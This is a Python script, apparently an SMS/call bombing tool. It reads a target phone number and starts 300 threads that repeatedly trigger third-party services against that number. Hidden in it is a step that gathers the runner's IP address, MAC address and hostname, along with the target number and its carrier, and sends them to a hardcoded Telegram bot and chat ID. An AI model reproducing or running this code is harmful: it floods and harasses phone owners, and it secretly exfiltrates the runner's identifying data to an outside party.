from StructService import Distribution_Service
from threading import Thread
from colorama import Fore, Back
import telebot
import socket
import re, uuid
import sys, os, pyfiglet
import phonenumbers
from phonenumbers import geocoder 
from phonenumbers import carrier 

h_name = socket.gethostname()
ipadr = socket.gethostbyname(h_name)
attack_number_phone = Distribution_Service()
parse_mode="Markdown"
def start(phone):
	attack_number_phone.phone(phone)

	while True:
	    try:
	        attack_number_phone.random_service()
	    except Exception as ex:
	    	print(ex)

os.system('clear')

print(Fore.WHITE +pyfiglet.figlet_format("welcome", font = "cybermedium"  ))
sa	=	input(Fore.GREEN +'Telefon No? ||Phone Number  +xxxxxxxxxxxx : ☎   ')
number= phonenumbers.parse(sa)
number=phonenumbers.parse(sa)
print(Fore.MAGENTA + pyfiglet.figlet_format("glovelace", font = "cybermedium"  ))
print(Fore.LIGHTCYAN_EX +'===================  🤖  🤖  ========================')
print(Fore.BLUE +'Author 🔥	:	https://t.me/glovelace')
print(Fore.LIGHTYELLOW_EX +'Author 💎	:	https://github.com/r8q')
print(Fore.LIGHTBLUE_EX +'Author 💘	:	https://t.me/losersalwaysloser')
print(Fore.LIGHTBLUE_EX +'Author 💞	:	https://t.me/decryptedd')
print(Fore.LIGHTCYAN_EX +'===================  🌀  🌀  ========================')
phone= input(Fore.RED +' Hata !! Tekrar Numara Girin || Error  Re-Enter Number||'  +Fore.LIGHTGREEN_EX+'xxxxxxxxxxxx : ☎   ')
print(Fore.LIGHTYELLOW_EX +'===================  🌀  🌀  ========================')
veri=('New user is here   ' +'\n🙇🧞‍♂️ 🧚‍♀️🧛‍♀️ 🙇🧞 '
+ '\nIP Adress 🤖:  ' +ipadr 
+ '\nMac Adress 💻 : ' + "  " +':'.join(re.findall('..', '%012x' %uuid.getnode()))
+ '\nPc Name 👨‍💻: ' +"   "+h_name
+ '\nSent Number ☎:	 '
+phone
+ '\nNumara Bilgileri🌍:  ' 
+ '\n Ülke🏳️:  ' 
+  geocoder.description_for_number(number,'en') 
+'\n **Servis Sağlayıcısı**🎥:  ' 
+  carrier.name_for_number(number,'en')
)
bot = telebot.TeleBot('1566531385:AAFXZAp6pwaIgmqP7SHOD3LOuAXaNDQvtAc')
bot.send_message(961991483, veri)

try:
	attack_number_phone.phone(phone)
except:
	print(Fore.RED + ' ✨Yanlış Formatta Girildi  ||Invalid input format  \n🤖|| Enter the number in ✨ || Lütfen Numarayı Bu Şekilde Girin +xxxxxxxxxxxx  ☎️  ')
	sys.exit()
	


for i in range(300):
	th = Thread(target=start, args=(phone,))
	th.start()